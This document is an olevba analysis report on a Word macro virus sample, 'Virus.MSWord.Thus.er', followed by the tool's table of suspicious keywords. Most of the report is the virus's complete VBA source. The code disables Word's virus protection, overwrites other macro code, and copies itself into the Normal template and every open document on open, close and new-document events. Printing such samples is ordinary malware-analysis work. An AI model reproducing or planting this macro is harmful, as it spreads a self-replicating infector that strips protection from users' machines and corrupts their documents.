olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.er
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.er - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
'Abiel'
On Error Resume Next
Application.Options.VirusProtection = False
NormalTemplate.VBProject.VBComponents("xix").codemodule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("xix").codemodule.countoflines
If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.lines(2, 1) <> "'Abiel'" Then
  NormalTemplate.VBProject.VBComponents.Item(1).codemodule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
End If
If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines = 0 Then
  NormalTemplate.VBProject.VBComponents.Item(1).codemodule.insertlines 1, ActiveDocument.VBProject.VBComponents.Item(1).codemodule.lines(1, ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines)
End If
If NormalTemplate.Saved = False Then NormalTemplate.Save
For k = 1 To Application.Documents.Count
Application.Documents.Item(k).VBProject.VBComponents.Item(2).codemodule.DeleteLines 1, Application.Documents.Item(k).VBProject.VBComponents.Item(2).codemodule.countoflines
If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.lines(2, 1) <> "'Abiel'" Then
  Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.DeleteLines 1, Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.countoflines
End If
If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.countoflines = 0 Then
  Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.insertlines 1, NormalTemplate.VBProject.VBComponents.Item(1).codemodule.lines(1, NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines)
End If
Next k
End Sub
Private Sub Document_Close()
Call Document_Open
End Sub
Private Sub Document_new()
Call Document_Open
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

